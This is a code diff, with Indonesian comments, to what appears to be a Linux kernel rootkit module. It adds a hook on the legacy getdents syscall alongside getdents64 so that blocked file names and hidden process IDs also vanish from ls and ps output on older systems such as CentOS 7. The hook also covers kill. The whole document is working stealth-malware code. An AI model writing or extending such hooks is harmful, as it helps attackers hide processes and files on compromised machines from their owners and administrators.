@@ -31,7 +31,18 @@ struct __attribute__((packed)) l4x_dirent64 {
 	char              d_name[];
 };
 
-#define NAME_OFF offsetof(struct l4x_dirent64, d_name)
+/* linux_dirent — syscall getdents LAMA (78): nama mulai offset 18, tanpa
+ * d_type. BUKTI LAPANGAN (CentOS7/glibc 2.17): ls & ps memanggil
+ * getdents(78), BUKAN getdents64 — karenanya KEDUANYA kini di-hook. */
+struct __attribute__((packed)) l4x_dirent32 {
+	u64               d_ino;
+	u64               d_off;
+	unsigned short    d_reclen;
+	char              d_name[];
+};
+
+#define NAME_OFF    offsetof(struct l4x_dirent64, d_name)  /* 19 */
+#define NAME_OFF_32 offsetof(struct l4x_dirent32, d_name)  /* 18 */
 
 static bool name_blocked(const char *n, unsigned int max)
 {
@@ -50,7 +61,7 @@ static bool name_blocked(const char *n, unsigned int max)
 	return l4x_is_hidden_pid(n);
 }
 
-static long l4x_filter_result(long ret, char __user *ubuf)
+static long l4x_filter_result(long ret, char __user *ubuf, unsigned int name_off)
 {
 	unsigned long pos = 0, out = 0;
 	char *kb;
@@ -66,13 +77,13 @@ static long l4x_filter_result(long ret, char __user *ubuf)
 		return ret;
 	}
 
-	while (pos + NAME_OFF < (unsigned long)ret) {
+	while (pos + name_off < (unsigned long)ret) {
 		struct l4x_dirent64 *d = (void *)(kb + pos);
 		unsigned int reclen = d->d_reclen;
 
-		if (reclen < NAME_OFF + 1 || pos + reclen > (unsigned long)ret)
+		if (reclen < name_off + 1 || pos + reclen > (unsigned long)ret)
 			break;
-		if (!name_blocked(d->d_name, reclen - NAME_OFF)) {
+		if (!name_blocked((const char *)d + name_off, reclen - name_off)) {
 			if (out != pos)
 				memmove(kb + out, d, reclen);
 			out += reclen;
@@ -119,7 +130,14 @@ long l4x_sys_getdents64(unsigned int fd, char __user *dirp, unsigned int count)
 {
 	long ret = l4x_call_orig_getdents64(fd, dirp, count);
 
-	return l4x_filter_result(ret, dirp);
+	return l4x_filter_result(ret, dirp, NAME_OFF);
+}
+
+long l4x_sys_getdents(unsigned int fd, char __user *dirp, unsigned int count)
+{
+	long ret = l4x_call_orig_getdents(fd, dirp, count);
+
+	return l4x_filter_result(ret, dirp, NAME_OFF_32);
 }
 
 long l4x_sys_kill(int pid, int sig)
@@ -146,7 +164,14 @@ long l4x_sys_getdents64(const struct pt_regs *regs)
 {
 	long ret = l4x_call_orig_getdents64(regs);
 
-	return l4x_filter_result(ret, (char __user *)regs->si);
+	return l4x_filter_result(ret, (char __user *)regs->si, NAME_OFF);
+}
+
+long l4x_sys_getdents(const struct pt_regs *regs)
+{
+	long ret = l4x_call_orig_getdents(regs);
+
+	return l4x_filter_result(ret, (char __user *)regs->si, NAME_OFF_32);
 }
 
 long l4x_sys_kill(const struct pt_regs *regs)
